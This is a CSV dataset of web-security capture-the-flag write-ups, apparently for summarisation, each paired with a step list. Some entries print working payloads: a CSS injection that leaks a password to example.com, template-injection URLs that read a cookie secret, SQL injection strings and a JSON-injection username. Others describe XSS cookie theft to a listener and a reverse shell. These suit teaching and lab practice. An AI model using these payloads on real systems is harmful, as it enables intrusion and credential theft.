"text","summary"
"Description: ""My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.""

You just need to change the cookie value to the base64 value of ""chocolate"".
And you get the flag.
","Change the cookie value to the base64 value of ""chocolate"".
Obtain the flag.
"
"Description: ""This is a super secure portal with a really unusual HTML file. Try to login.""

You need to view the page source.
On seeing it, you will realize that this script has been obsfucated, and is checking for the password for this portal. The list `var _0x575c` has been encoded to hex, which translates to this: `var _0x575c = [""2-4"", ""substring"", ""4-7"", ""getItem"", ""deleteItem"", ""12-14"", ""0-2"", ""setItem"", ""9-12"", ""^7M"", ""updateItem"", ""bb="", ""7-9"", ""14-16"", ""localStorage""];`

Now, in the function `CheckPassword`, you see the word `window` being repeated many times. For an example, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]` is actually `window.localStorage.setItem` and so on.

The password has been split to many parts.
We have each part of the password stored to an assigned key.
Similarly, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]` is `window.localStorage.getItem`. We use this command to check the splitted password with our input password.
","View the page source.
Identify the obfuscated JavaScript code and translate the hex-encoded list.
Understand the function `CheckPassword` and identify parts of the password.
Combine the password parts to obtain the complete password.
"
"Description: ""Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.""

This is a CSS injection challenge (of course you can do `<<script >>` but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type=""password""][value^=""c""] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.

You may pass a long list of such CSS selectors, for all letters.

This will therefore tell you which character matched, which you can see on your own server (here example.com). Once the first character is leaked, you can go ahead and try to leak the next character.

An so on, until you find the entire password. You can test this on your browser by storing a cookie called `password` with the value `csictf`. Now pass the following to get a request on your server (replace example.com with your server).

Pass these payloads to `/admin` and you can leak the admin cookie `password`, which is the flag.

Using this method, you can progressively leak the entire password and obtain the flag.
","Recognize the challenge as a CSS injection challenge.
Create a series of CSS selectors to leak the characters of the hidden `password` field.
Set up a server to receive the leaked characters (e.g., example.com).
Inject the CSS selectors into the input box and submit the form.
Monitor the server to collect the leaked characters and progressively reconstruct the password.
Obtain the flag by leaking the admin cookie `password`.
"
"Description ""You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?
(I love you 8000.)""

This challenge involves exploiting the server script through Tornado template injection to obtain the cookie secret and forging a signed cookie to access the flag.

- The server script runs on `http://chall.csivit.com:30279/`. Input is taken as the ""icecream"" value. 
 
- A secure cookie is being set and compared to print a flag value. In tornado, signed cookies contain the encoded value of the cookie
  alongwith a timestamp and an HMAC signature. Such cookies are supported by the set_secure_cookie and get_secure_cookie methods which require a specific secret key: cookie_secret.

- Upon visiting `http://chall.csivit.com:30279/?icecream={{globals()}}`, you see something useful:
`'application': <tornado.web.Application object at 0x7f2976579750>`

- You now know that the name of the variable `tornado.web.Application(...)` is `application`.

- Run the server script with the exploit payload `http://chall.csivit.com:30279/?icecream={{application.settings[""cookie_secret""]}}` to get the cookie_secret value `MangoDB` displayed on the website.
  
- Replace the value of the secure cookie `admin` to the required comparison value `true` to obtain a signed cookie on the browser. Now, replace the signed cookie generated upon running the server script with the one obtained after the secure cookie value was set to `true`. This results in a cookie which looks like the following. Note `dHJ1ZQ==` is base64 for `true`.
""2|1:0|10:1594808471|5:admin|8:dHJ1ZQ==|5da7d1e446451e825e42001e7f07360e2e2e77c9c68b14fca1a517259712cdac""

- Upon reloading the server script, the text on the website would change from `Unfortunately, you aren't worthy` to the flag value.
","Visit the server script at `http://chall.csivit.com:30279/`.
Exploit Tornado template injection with `http://chall.csivit.com:30279/?icecream={{globals()}}` to find the `application` variable.
Use the payload `http://chall.csivit.com:30279/?icecream={{application.settings[""cookie_secret""]}}` to obtain the `cookie_secret` value `MangoDB`.
Set the secure cookie `admin` to `true` and generate a signed cookie in the browser.
Replace the signed cookie generated upon running the server script with the one obtained after setting the secure cookie value to true.
Reload the server script to see the flag value on the website.
"
"In this challenge, you can see the `index.php` code by default.

So, you see that we have to match the value of `hash` and `target`. It is checked that the `hash` param does not equal `10932435112`, but again it checks that the sha1 hash of `hash` is equal to that of `10932435112`. We know that the sha1 hashes will not match ever, so it's not a bruteforce challenge. Later, you notice that the `$hash` and the `$target` and matched using `==` and not `====`. `==` is vulnerable to type juggling!

If you see the hash of `10932435112`, it starts with `0e...`. So any other hash which starts with `0e` will match this with `==`, since `==` does not check types, so these will be treated as numbers. So, you have to bruteforce considerably lesser amount of values. 

You would find a lot of matches.

Pass any of these with the GET param `hash`, and you get the flag.
","Observe that the `index.php` code checks that the `hash` parameter does not equal `10932435112`, and the sha1 hash of `hash` equals that of `10932435112`.
Notice that `$hash` and `$target` are compared using `==`, which is vulnerable to type juggling.
Find a hash starting with `0e` that matches the sha1 hash of `10932435112` using `==`.
Pass one of these matching values with the GET parameter `hash` to obtain the flag.
"
"When you look at the documentation for the source for the `flask_caching` module, you can optionally store a python pickle in the redis by prepending it with `'!'`. You can use python pickles for RCE, when the caching modules uses `pickle.load()` to load the cached data.

Set up a netcat listener on your server and run the following script with your IP and PORT.
[Python script: Create a payload for RCE and send it to the server]

On your netcat listener, you would get the flag.
[HTTP POST request with the flag]
","Analyzed `flask_caching` module documentation and found the option to store python pickle in redis with '!' prefix.
Recognized that python pickles can be used for RCE when `pickle.load()` is used to load cached data.
Set up a netcat listener on the server.
Ran the provided Python script with server IP and PORT to create and send RCE payload.
Received the flag on the netcat listener through an HTTP POST request.
"
"The critical line in the code is:
[Python code: Use subprocess.Popen to call FFmpeg]

Here, you can perform Remote Code Execution (RCE) with the file name. The idea is to grep the flag from the main.py file and write it on the image to which the GIF is going to be converted. This can be done with the -vf drawtext=... option. The payload used is:
[Payload: Include grep and drawtext options in the file name]

When you upload a GIF with this payload as the file name, you will receive a resulting PNG with the flag written on it.
","Identified critical line in code using subprocess.Popen to call FFmpeg.
Recognized potential for Remote Code Execution (RCE) with file name.
Crafted a payload using -vf drawtext=... option to grep the flag and write it on the output image.
Uploaded a GIF with the payload as the file name.
Received a resulting PNG with the flag written on it.
"
"In this challenge, you see a bunch of captcha's floating around on your screen, and the goal is to successfully get 5 captchas. There's many ways to solve this, here's what was done:

When you see the source, this is the function which creates the captchas and makes them move:
[JavaScript code: Captcha creation and movement function]

To make it easier to solve the captchas, modify this function using your browser's developer tools, removing the part where it runs the loop, which is responsible for moving the captchas.
[Modified JavaScript code: Captcha creation function without movement]

Now, you can manually add 5 captchas and get them. Just call the function `addCaptcha()` and keep clicking the boxes. When you're done with 5, click on `GET FLAG`, and copy the flag from the screen!
","Analyzed source code and found the JavaScript function responsible for captcha creation and movement.
Modified the function using browser's developer tools to remove the movement loop.
Manually called `addCaptcha()` function to add 5 captchas without movement.
Clicked on the boxes to solve the captchas.
Clicked on `GET FLAG` and copied the flag from the screen.
"
"The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. The flag is right in front of you.""

Upon opening the link, an image is displayed, which hints at Sweden. So, the solution involves setting the language headers to Swedish using a ""curl"" command.
[Shell command: Set Accept-Language header to Swedish]

Executing this command returns the flag.
","Received challenge text hinting at using a ""curl"" command and a connection to Sweden.
Set the Accept-Language header to Swedish using the curl command provided.
Executed the command and obtained the flag.
"
"The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. Why do logos make things so recognizable?""

Upon opening the link, an image is displayed that shows the logos of Xbox and Linux. This is viewed on a Windows device.

To change the User-Agent to Linux, use the following command:
[Shell command: Set User-Agent header to Linux]

Executing this command returns a response with the Linux logo gone.

Next, set the User-Agent to both Linux and Xbox:
[Shell command: Set User-Agent header to Linux Xbox]

Executing this command gives the flag inside the body of the page.
","Received challenge text hinting at changing User-Agent and the presence of logos.
Opened the provided link, displaying Xbox and Linux logos on a Windows device.
Changed the User-Agent to Linux using the provided shell command, removing the Linux logo from the response.
Set the User-Agent to both Linux and Xbox using another shell command.
Executed the command and found the flag inside the page body.
"
"The challenge provides the following hint: ""Normal fries are nice, but everything's better with a curl in it. I'm with you, every step of the way.""

Upon opening the link, an image is displayed. To solve the challenge, a series of curl commands were executed with various headers, cookies, and JSON data. Here's the process:

Change the method to POST and send a request to the URL.

Set the Referer header to Google and send a request to the URL. In response, you receive a hint to attend a dinner party hosted by dscvit.

Set the Host header to dscvit.com and send a request to the URL. The response mentions potatoes, carrots, milk, and cookies.

Set the user cookie to ""root"" and send a request to the URL, as potatoes and carrots are root vegetables. The response contains a JSON-related hint.

Set the Content-Type header to application/json, include JSON data, and send a request to the URL. The response points out that ""messi"" is required in the JSON data.

Add ""messi"" to the JSON data and send a request to the URL. The response asks for the club Messi is in.
Change the ""messi"" value to ""psg"" and send a request to the URL, since Messi is playing for PSG at the time.

After executing the final command, the flag is returned.","Changed the method to POST and sent a request to the URL.
Set the Referer header to Google and received a hint about attending a dinner party.
Set the Host header to dscvit.com and received a response mentioning various ingredients.
Set the user cookie to ""root"" and received a JSON-related hint.
Set the Content-Type header to application/json, included JSON data, and received a hint about needing ""messi"".
Added ""messi"" to the JSON data and received a response asking for Messi's club.
Changed the ""messi"" value to ""psg"" and sent a request to the URL.
Obtained the flag in the response.
"
"This Python script demonstrates an SQL Injection attack against the web application's database to solve the ""Taxi Union"" and ""Gate Keeper"" challenges. The script performs the following steps:
[Import the necessary libraries and initialize the variables.
Set the appropriate URL, check string, key, and column values based on the selected challenge (either ""Taxi Union"" or ""Gate Keeper"").
Iterate through each character in the domain (letters, digits, and special characters) while searching for the flag.
For each character, create an SQL injection payload that checks if the current flag value concatenated with the character is a prefix of the targeted column's value.
Send an HTTP POST request to the URL with the payload as the form data.
If the check string is found in the response, it means the character is part of the flag. Add the character to the flag and continue iterating through the domain.
Repeat the process until the entire flag is discovered.]

The Python script helps to find the flag by exploiting SQL injection vulnerability in the web application.
","Import necessary libraries and initialize variables.
Set URL, check string, key, and column values for the chosen challenge (""Taxi Union"" or ""Gate Keeper"").
Iterate through each character in the domain while searching for the flag.
Create an SQL injection payload for each character, checking if it's a prefix of the targeted column's value.
Send an HTTP POST request with the payload as form data.
If the check string is found in the response, add the character to the flag and continue iterating.
Repeat the process until the entire flag is discovered using the Python script's SQL injection exploit.
"
"The challenge begins with the given text: ""There is nothing here I promise! ;)""

Upon opening the link, an image is displayed. By checking the network tab, a response header with a specific string is found. A curl request is then sent, setting the cookie to the given string.

The response contains another string. A new curl request is sent with this new string as the cookie.

To automate this process, a Python script is written:
[Define the initial URL and the first flag value.
Create a loop that continues until the final flag value, 'EOF', is found.
In each iteration, send an HTTP GET request to the URL with the current flag value as a cookie.
Append the received string to the list of flags and continue iterating.
Once the loop is finished, print the received strings.]

The output contains multiple strings, which appear to be MD5 hashes. After decoding these hashes, a sequence of characters is obtained, which is the flag.
","Opened the provided link and found a response header with a specific string.
Sent a curl request setting the cookie to the given string and received another string in response.
Sent a new curl request with the new string as the cookie.
Wrote a Python script to automate the process, iteratively sending HTTP GET requests with flag values as cookies.
Obtained multiple strings from the output, which were MD5 hashes.
Decoded the MD5 hashes to reveal a sequence of characters, which is the flag.
"
"This solution demonstrates a SQL Injection attack to solve a CTF challenge. The script also works for the `Gate Keeper` challenge. Here's a high-level explanation of the Python script:
[Import the necessary libraries: `requests` and `string`.
Initialize an empty `flag` variable, and define the search domain containing all possible characters.
Set the challenge, URL, check, key, and column variables based on the challenge being solved (either ""taxi union"" or ""gate keeper"").
Enter an infinite loop that iterates through each character in the search domain.
For each character, create a payload containing a SQL injection query using the current flag and character.
Send an HTTP POST request to the URL with the payload as the data.
Check if the expected response text is found in the received response.
If the expected response is found, add the character to the flag and print it.
Break the loop once the flag is found.]

The script automates the process of testing various payloads to exploit the SQL Injection vulnerability and retrieve the flag.
","Import necessary libraries (`requests` and `string`) and initialize an empty flag variable.
Define the search domain containing all possible characters and set challenge-specific variables.
Enter an infinite loop iterating through each character in the search domain.
Create a payload containing a SQL injection query using the current flag and character.
Send an HTTP POST request to the URL with the payload as the data.
Check if the expected response text is found in the received response.
If the expected response is found, add the character to the flag and print it.
Break the loop once the flag is found, exploiting the SQL Injection vulnerability.
"
"When you examine the source code, you'll notice the application uses `bodyParser.urlencoded` with `extended: true`. This allows arrays and objects to be passed in the request body. In the `/login` POST route, the output has not been stringified, so it is possible to pass an object in the query statement.
[JavaScript code: Configure bodyParser and create SQL query]

The exploit is to pass an object as the password parameter, with a known attribute. This causes the SQL query to be evaluated in a way that allows logging in without knowing the correct password. We'll refer to the official `mysql` docs for more information on how objects are converted into comma-separated attributes in SQL queries.

The final payload for this exploit is:
[HTTP POST request: Send payload with object as password]

From here, you can just take the cookie you received, and use that to visit `/flag`. Alternatively, you can use a Python script to automate the process:
[Python script: Send payload, get the flag, and print it]

You can run this script and use `grep` to find the flag.
","Examine the source code and identify the use of `bodyParser.urlencoded` with `extended: true`.
Notice that the output has not been stringified, allowing objects to be passed in the query statement.
Create an exploit by passing an object as the password parameter, causing the SQL query to be evaluated in a way that allows logging in without knowing the correct password.
Consult the official `mysql` docs for more information on object conversion in SQL queries.
Construct the final payload and send it as an HTTP POST request.
Use the received cookie to visit `/flag` or automate the process with a Python script.
Run the script and use `grep` to find the flag.
"
"When you visit the website, you find that there's a cookie containing a JWT. It's hashed using `HS256`. The JWT secret was brute-forced using `rockyou.txt` and John The Ripper, which revealed the secret as `supersecret`. Using this secret, a JWT with `username: admin` was created and added to the cookie, logging in as admin.

Visiting a random route starting with `/admin/` that throws a 404 error, it was observed that there's scope for template injection in the 404 page. By climbing up the Python MRO using `__class__` and `__bases__`, etc., a list of all available classes was found. At index 405, the `subprocess.Popen` class was discovered.

Using this class, a reverse shell was spawned by sending a specially crafted URL. A netcat listener was started on the server at the specified port, which ultimately led to gaining a shell.

Upon listing the files and reading the content of `flag.txt`.
","Visited website and found JWT hashed with HS256 in a cookie.
Brute-forced JWT secret using rockyou.txt and John The Ripper, revealing secret as 'supersecret'.
Created a JWT with 'username: admin' and added it to the cookie to log in as admin.
Found template injection vulnerability in the 404 page of an /admin/ route.
Explored Python MRO and discovered the subprocess.Popen class.
Spawned a reverse shell using a crafted URL and netcat listener.
Gained shell access and read the content of 'flag.txt'.
"
"The challenge is very simple once you know what to do.
This is the hint:
""We will only give our flag to our Agent 95! He is still running an old version of Windows...""

We assume Agent 95 uses Windows 95. So just change the `User-Agent` header to `Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)`.

We use a Python script:
[Python code: using `requests` to send a GET with the `User-Agent` header]

In the response, you got the flag.
","Understand the hint and assume Agent 95 uses Windows 95.
Change the `User-Agent` header to `Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)`.
Use a Python script with the `requests` library to send a GET request with the modified `User-Agent` header.
Receive the response containing the flag.
"
"Well, if you happen to look at the local storage, you'll get the flag directly. But that's not how we got it because we're stupid. So, here's what we did.

You see a JS file in the sources: `jquery.jscroll2.js`. Now, to understand what exactly it does, we first convert the huge list on `line 1` from `hex` to `string` to be able to make sense of it. So let's convert it using a script written in `python2`.

Once you convert it, you will see some meaningful strings such as `localStorage`, `setItem`, `data`, `defaults`, `extend`, `function`, etc..
Now we can try to make sense of the rest of the code.

We see an interesting line. Now that we have the strings figured out:
[JavaScript code: stores the decoded base64 string in local storage with the key 'flag']

So the script basically converst the `base64` string `SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9` and stores it in local storage with the key `flag`. Well, now you can just check the local storage, or just convert this string to ASCII using BASH.
","Examine the local storage to find the flag directly (alternative solution).
Find and analyze the `jquery.jscroll2.js` file in the sources.
Convert the hex list on line 1 to a string using a Python script.
Understand the decoded JavaScript code and identify the line that stores the decoded base64 string in the local storage with the key 'flag'.
Check the local storage or convert the base64 string to ASCII using BASH to get the flag.
"
"Press `Ctrl + U` on your browser to view the source code of the `HTML` file. Search for `flag{...}`. 
[HTML source code with flag]
","Press `Ctrl + U` to view the source code of the HTML file.
Search for `flag{...}` in the source code.
"
"This is a beginner SQL Injection challenge. To retrieve the flag, you need to inject a malicious SQL query into the login form.

Simply pass the username and the password as ' or 1=1 -- , which will be interpreted as a SQL query that always returns true, and comment out the rest of the query with the -- symbol. This will cause the server to execute the SQL query as if you had provided valid login credentials, resulting in an alert box displaying the flag.
","Recognize the challenge as a beginner SQL Injection.
Inject a malicious SQL query into the login form using the username and password as ' or 1=1 -- .
The server executes the SQL query as if valid login credentials were provided.
An alert box displays the flag.
"
"[This challenge involves exploiting a vulnerability in the `generateToken` function in a JavaScript file. The function generates a token for a given `username`, where the `username` is included as a string in a JSON object that is encrypted using `aes-192-cbc`. However, the function forms the JSON object in a way that allows the "" character to be closed with the help of the string passed in the `username` parameter, and sets the `member` field to a non-zero value.]

You really just need to notice this function. Notice, the token is not created like `token.username = username`. It's formed in the following way:
```
const token = `{""integrity"":""${INTEGRITY}"",""member"":0,""username"":""${username}""}`
```

To exploit the vulnerability, we can pass the `username` as `"",""member"":""1` which will close the `""` character and set `member` to `1`. Then, we can visit `/api/flag` to get the flag in JSON format.
","Identify the vulnerability in the `generateToken` function, which creates a token in an exploitable manner.
Pass the `username` as `"",""member"":""1`, closing the `""` character and setting `member` to `1`.
Visit `/api/flag` to get the flag in JSON format.
"
"This challenge uses XSS to get the flag from the `admin bot's` cookies.

First, try a random `<h1>Hello</h1>` tag to see if you can put HTML in your pastebin.

Inspecting the `js` file of the page we can can infer 2 things:
- the content of the page is obtained from the URL, which is a base64 encoded form of the text you entered.
- the `clean` function will not allow writing of text if bracket pairs do not match.

It is rather easy to break this `clean` function, by adding an extra `>` at the starting of your XSS script. Here's the payload:
[Payload for XSS attack with an extra "">"" at the beginning of the script]

Your payload has the following URL:
[URL with base64 encoded payload]

You can simply set up a `netcat listener` using `nc -l port` on your server, and pass the link to the `Admin Bot`. The admin bot is basically a headless chrome browser which has the flag in it's cookies. When it visits your site, the XSS steals the cookies from the admin bot and sends it to your server. You get a request which looks like:
[HTTP GET request with the flag in the cookie]
","Test if HTML tags can be inserted by trying a random `<h1>Hello</h1>` tag.
Inspect the JavaScript file to understand the content retrieval and `clean` function.
Create an XSS payload with an extra `>` at the beginning to bypass the `clean` function.
Encode the payload in base64 and create a URL with the encoded payload.
Set up a `netcat listener` on your server using `nc -l port`.
Pass the link to the `Admin Bot`, which will trigger the XSS attack.
Receive an HTTP GET request on your server containing the flag in the cookie.
"
"This site allows you to write HTML, so it's basically shouting at you to perform an XSS attack. The URL of the webpage created actually consists a base64 encoded form of the content of the page. We can see the `js` in the source.

The main thing we notice is that it prevents `script` tags and it allows only the following attributes for an element: `'src', 'width', 'height', 'alt', 'class'`. So we have to perform an XSS with these attributes. So, here's the payload:
[Payload for XSS attack using an iframe and the 'src' attribute]

Note that here, the site is supposed to be `https`, otherwise there will be a Content Security Policy Bypass (CSP Bypass) error, and the request won't be sent. We can get the URL of the resulting webpage:
[URL with base64 encoded payload]

On the server, we can create a simple Node.js backend which accepts the cookie as a query param and logs it. Here's an example of the backend code:
[Node.js code for a simple backend to log the stolen cookie]

When the link for the website is sent to the `admin bot`, which is basically a headless chrome browser, it visits the page and it's cookie is stolen and sent to the server at `myserver.tld`. The cookie stores the `flag`.
","Notice that the site allows HTML and prevents `script` tags, allowing only specific attributes.
Create an XSS payload using an iframe and the 'src' attribute.
Encode the payload in base64 and create a URL with the encoded payload.
Ensure the site uses `https` to avoid Content Security Policy Bypass (CSP Bypass) errors.
Create a Node.js backend to accept the stolen cookie as a query param and log it.
Send the link to the `admin bot`, which visits the page and has its cookie stolen.
Retrieve the flag stored in the stolen cookie on your server.
"
"The first part of the challenge is a sort of vague guesswork. In the challenge description, there are two words - `page` and `upload` - which the author wants you to notice. Also, when you view the homepage source, it has a comment `<!-- get the 'page' :eyes: -->`. 

So, the first try was to pass a query `page` in the flag. So, we tried to visit `?page=flag`. Here, we get a gif.

Now, since the description had the word `upload` in it, we tried to checkout if there is a page called upload, and there was!

Here, we can assume that we have to do some sort of local file inclusion. So we created a file called `payload.php`, and tried to `ls` the directory. We saw a lot of files called `flag`, so we just decided to print all files and just search on the browser.

Here's the final payload for the PHP code:
[PHP code payload for local file inclusion to find all files and print them]

Now you can visit the route `/?page=payload` (name of the file you uploaded). This gives a page with a lot of stuff.

So, the contents of all the files are now on the browser. All you have to do is open the source code and search for the flag format.
","Notice the words `page` and `upload` in the challenge description and the comment in the homepage source code.
Visit `?page=flag` and find a gif.
Check if there's a page called `upload`.
Assume the challenge involves local file inclusion.
Create a `payload.php` file to list and print all files in the directory.
Upload the payload and visit the route `/?page=payload`.
View the contents of all the files in the browser.
Open the source code and search for the flag format.
"
"Description: ""BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!""

After start of the instance picoCTF will provide you source code of the site and link to running instance.

The site has a login screen and a main screen with books. We can't access any of them except the first one. Let's dive into the code.

There are some files, that are interesting to us. Inside `JwtService.java` we can see all data, that JwtToken contain, the issuer and that `secretGenerator` gives the secret key.
In `SecretGenerator.Java`, we found out that ""secret key"" is `1234`. We have all the information to encode and decode JWT tokens.

We need a userId, so let's go back to the login screen. Using Google Chrome, press F12, open `Network` tab and login with creds from picoCTF: user:`user`, pass:`user`.
We can get the JWT token for our user in the payload of the response. Copy it and go to `jwt.io` to decode it, revealing the `userId` as `1`.

Now let's encode our JWT token with role `Admin`. In the `controllers` directory, we can find `UserController.java`, which has an endpoint for updating user roles. We will use Postman to send some requests with the new JWT to update our role and read the flag.

First, we need to create a new user on the site because we can't patch the default user role. Next, we need to obtain the users list. Put the token into headers and send a request. Our id is `6`. Now let's patch our role.

Now that we are an `Admin`, just log in and read the flag.
","Analyze the provided source code and discover that the secret key is `1234`.
Log in with given credentials (user:""user"", pass:""user"") and capture the JWT token from the payload.
Decode the JWT token using `jwt.io` to find the `userId` as `1`.
Encode a new JWT token with the role `Admin`.
Use Postman to send requests with the new JWT token to update the user role and read the flag.
Create a new user on the site as the default user role cannot be patched.
Obtain the users list, find the new user's id (e.g., `6`), and patch the user's role to `Admin`.
Log in as an `Admin` and read the flag.
"
"Description: ""Can you find the flag on this website.""

Additional details will be available after launching your challenge instance.
 
After start of the instance picoCTF will provide you a link to running instance.

If you type `user` as the username and `user` as the password, you will get a message that reveals the query for the login request. Since we know the query, we can easily get in by entering `'or 1=1;--` in the `pass` field. This modifies the query to be something like:
[SQL query modified with 'or 1=1;--' for bypassing authentication]

We can test some queries to find out what database is used. By entering this query: `123' UNION SELECT 1, sqlite_version(), 3;--`, we now know that the site is using SQLite.

Now we can list all tables with this query: `123' UNION SELECT name, sql, null from sqlite_master;--`. We find the flag in the table named `more_table`.

To get the flag, we use this query:
[SQL query to retrieve flag from the 'more_table']
","Log in with the provided username and password (`user` and `user`) to reveal the query for the login request.
Bypass authentication by entering `'or 1=1;--` in the pass field, which modifies the query.
Identify the database used by entering the query `123' UNION SELECT 1, sqlite_version(), 3;--`, revealing it as SQLite.
List all tables with the query `123' UNION SELECT name, sql, null from sqlite_master;--`, finding the flag in the `more_table`.
Retrieve the flag by using the SQL query targeting the `more_table`.
"
"Description: ""The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?""

Additional details will be available after launching your challenge instance. 

After start of the instance picoCTF will provide you a link to running instance.

There is a site.

We saw tag `XXE` -> `XML external entity` and also, when we inspect static resources (F12 -> Sources in Google Chrome) of the site, we saw this two files:
- detailsCheck.js
- xmlDetailsCheckPayload.js

So, now we know for sure, that it is XXE. 

Also in the index.html we saw the endpoint for the POST request:

We need just to make POST request to the `<url_of_site>/data` with XML payload to get the flag.

Let's check the format for XML request. Just click button on the site and look the request format in `Network` tab.

Now just send `POST` request with our payload and obtain the flag.","Identify the XXE (XML external entity) vulnerability by inspecting static resources (F12 -> Sources in Google Chrome), finding `detailsCheck.js` and `xmlDetailsCheckPayload.js`.
Locate the endpoint for the POST request in the `index.html` file.
Determine the format for the XML request by clicking the button on the site and observing the request format in the `Network` tab.
Send a POST request with the XML payload to `<url_of_site>/data` to obtain the flag.
"
"The web application allows you to create a meme specifying the URL of an image, the top text and the bottom text. The image can be exported in PDF format clicking on the ""Export!"" button.

Clicking on the button, a POST request is created.

Creating a listener, you can discover that two requests are performed to retrieve the image.

PhantomJS/2.1.1* is vulnerable to *CVE-2019-17221* and it is a deprecated package.

After some analysis, you can discover that top and bottom texts parse the HTML, interpreting it.

So it is sufficient to craft a payload like the following for one of the two texts.

[HTML script that performs an XMLHttpRequest to fetch the contents of the file ""/etc/flag.txt"" and writes it to the document. This could be an example of a cross-site scripting (XSS) attack or an attempt to access sensitive information.]

Putting the payload in a POST request.

A pdf with the flag will be returned.","Explore the web application and find it allows you to create memes with an image URL, top text, and bottom text.

Discover that a POST request is created when clicking the ""Export!"" button.

Set up a listener to observe that two requests are performed to retrieve the image.

Identify that PhantomJS/2.1.1 is vulnerable to CVE-2019-17221 and is a deprecated package.

Determine that top and bottom texts parse the HTML, interpreting it.

Craft a payload for one of the texts, which can be an example of a cross-site scripting (XSS) attack or an attempt to access sensitive information.

Insert the payload in a POST request.

Receive a PDF with the flag as a result.
"
"The website contains a login form with two different authentications, user credentials and guest account, managed by a the script auth.js.

Analyzing the JavaScript, you can discover that a query to a GraphQL endpoint is performed with the standard authentication. Credentials are put into cookies.

Guest credentials, decoded from base64, are the following.

Connecting as guest, you can reach the dashboard listing all the data and discover main.js which contacts the GraphQL backend to retrieve data.

Queries discovered till now are the following:
mutation { login(username:""username"", password:""password"")};
query Query { Challs { id title description category author points }}.

You can enumerate types and dump the database schema.

With graphql-voyager you can easily view the schema structure.

The ID of the challenge that should have the flag is `35`. You can try to retrieve the flag, but you will discover that you are not authorized.

There is a query, `allUsers`, that can be used to retrieve users data.

So you can craft the authentication cookie for the administrator.

And then retrieve the data for the challenge with a POST request.

You can read hint data too.

You can dump all challenges data, but there is no flag at all.

With the following payload, you can discover a SQL error.

So you can craft a SQL injection payload discovering the flag.","Analyze the website with a login form and identify the auth.js script managing user credentials and guest account.

Examine the JavaScript and find a query to a GraphQL endpoint with standard authentication, using cookies for credentials.

Decode guest credentials from base64 and connect as a guest to access the dashboard.

Discover the main.js script and GraphQL queries for authentication and challenges data.

Enumerate types and dump the database schema, then visualize the schema structure with graphql-voyager.

Identify the ID of the challenge containing the flag and attempt to retrieve it, only to find you're not authorized.

Use the `allUsers` query to obtain user data and craft an authentication cookie for the administrator.

Retrieve the challenge data and hints with a POST request.

Dump all challenges data and discover a SQL error using a crafted payload.

Create a SQL injection payload to retrieve the flag.
"
